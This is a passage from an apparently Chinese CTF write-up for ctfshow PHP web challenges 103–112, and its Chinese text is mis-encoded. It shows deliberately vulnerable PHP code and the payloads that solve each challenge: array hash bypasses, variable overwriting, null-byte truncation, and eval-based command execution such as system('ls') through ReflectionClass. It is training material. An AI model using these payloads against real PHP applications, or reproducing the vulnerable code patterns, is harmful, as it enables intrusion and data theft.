11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-23 21:03:24</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*p.*h.*p.*/i&quot;</span>,<span class="variable">$str</span>))&#123;  <span class="comment">//è¿‡æ»¤äº†PHPï¼Œä½†æ˜¯ä¸å½±å“</span></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sorry&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: v1 in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">14</span></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: v2 in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: v3 in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">16</span></span><br><span class="line">hacker</span><br></pre></td></tr></table></figure><p>ç™½å«–102</p><h3 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: atao</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-28 22:27:20</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>))&#123;   <span class="comment">//å“ˆå¸Œå€¼ä¸€æ ·</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221025211512515.png"></p><p>åªéœ€è¦v1çš„å€¼ç­‰äºv2çš„å€¼å°±è¡Œï¼Œç®€å•çš„æœ‰ç‚¹ä¸å’‹ç›¸ä¿¡</p><p>è¿˜å¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ï¼Œv1[]&#x3D;2       v2[]&#x3D;1</p><h3 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-28 22:34:07</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;æ—¢ç„¶ä½ æƒ³è¦é‚£ç»™ä½ å§ï¼&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;   <span class="comment">//å¯¹getè¿›è¡Œéå†</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;   <span class="comment">//è¦†ç›–èµ‹å€¼</span></span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;  <span class="comment">//åˆ¤æ–­ï¼Œflagå€¼ä¸èƒ½è¢«è¦†ç›–</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ</span><br></pre></td></tr></table></figure><p>è¿›è¡Œè¦†ç›–</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">?suces=flag</span><br><span class="line">error=suces</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221025212945991.png"></p><h3 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: atao</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-28 22:38:27</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>) &amp;&amp; <span class="variable">$v1</span>!=<span class="variable">$v2</span>)&#123;  <span class="comment">//å¤šäº†ä¸€ä¸ªä¸ç›¸ç­‰</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ•°ç»„ç»•è¿‡        <code>v2[]=1                    v1[]=2</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221026190123541.png"></p><h3 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-28 23:24:14</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">       <span class="title function_ invoke__">parse_str</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="title function_ invoke__">md5</span>(<span class="variable">$v3</span>))&#123;    <span class="comment">//è¦ä½¿æ•°ç»„v2ç­‰äºmd5(v3)</span></span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>parse_str     å°†å­—ç¬¦ä¸²è§£æä¸ºå¤šä¸ªå˜é‡</p><p><a href="https://blog.csdn.net/akxnxbshai/article/details/122696507?ops_request_misc=&request_id=&biz_id=102&utm_term=ctfshow%20web%E5%85%A5%E9%97%A8107&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-122696507.142%5Ev62%5Epc_rank_34_queryrelevant25,201%5Ev3%5Econtrol_1,213%5Ev1%5Econtrol&spm=1018.2226.3001.4187">å‚è€ƒ</a></p><p>æ³¨é‡Šï¼šå¦‚æœæœªè®¾ç½® <strong>array</strong> å‚æ•°ï¼Œç”±è¯¥å‡½æ•°è®¾ç½®çš„å˜é‡å°†è¦†ç›–å·²å­˜åœ¨çš„åŒåå˜é‡ã€‚</p><p>å¯¹v2[â€˜flagâ€™]çš„å€¼è¦†ç›–</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;<span class="comment">// cfcd208495d565ef66e7dff9f98764da</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>?v3=0</code></p><p><code>v1=flag=cfcd208495d565ef66e7dff9f98764da</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221026193744626.png"></p><h3 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-28 23:53:55</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;  <span class="comment">//æ­£åˆ™  +å·è¡¨ç¤ºåŒ¹é…1æ¬¡æˆ–1æ¬¡ä»¥ä¸Š,æ‰€ä»¥æˆ‘ä»¬æˆªæ–­å‰å¿…é¡»æœ‰ä¸ªå­—æ¯</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;    <span class="comment">//åè½¬</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">error</span><br></pre></td></tr></table></figure><p>0x36dçš„10è¿›åˆ¶ä¸º877</p><p>eregå‡½æ•°å­˜åœ¨NULLæˆªæ–­æ¼æ´ï¼Œå¯¼è‡´äº†æ­£åˆ™è¿‡æ»¤è¢«ç»•è¿‡,æ‰€ä»¥å¯ä»¥ä½¿ç”¨%00æˆªæ–­æ­£åˆ™åŒ¹é…,è¿›å…¥ä¸‹ä¸€ä¸ªåŒ¹é…</p><p><code>?c=a%00778</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221026200253273.png"></p><h3 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-29 22:02:34</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åå°„    <code>?v1=ReflectionClass&amp;v2=system(&#39;ls&#39;)</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221029165026431.png"></p><p><code>?v1=ReflectionClass&amp;v2=system(&#39;tac fl36dg.txt&#39;)</code></p><p><code>?v1=exception&amp;v2=system(&#39;tac fl36dg.txt&#39;)</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>=<span class="string">&#x27;å¤§èœé¸¡&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin =<span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ctfshow ~=v1</span></span><br><span class="line"><span class="comment">//&#x27;aaaa&#x27; ~=v2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//åªè¦æ˜¯å˜é‡åé¢ç´§è·Ÿç€(),é‚£ä¹ˆå¯¹è¿™ä¸ªå˜é‡è¿›è¡Œå‡½æ•°è°ƒç”¨</span></span><br><span class="line"><span class="comment">//$a=&#x27;phpinfo&#x27;;  $a();</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;aaaa&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221029165229290.png"></p><h3 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-29 22:49:10</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿‡æ»¤ç¬¦å·å’Œæ•°å­—ï¼Œåªèƒ½ç”¨çº¯å­—æ¯</p><p>getcwd       <code>?v1=FilesystemIterator&amp;v2=getcwd</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221102204615400.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221102204717270.png"></p><h3 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-30 02:41:40</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>?v1=ctfshow&amp;v2=GLOBALS</code>       &#x2F;&#x2F;å…¨å±€å˜é‡</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221103194957650.png"></p><h3 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   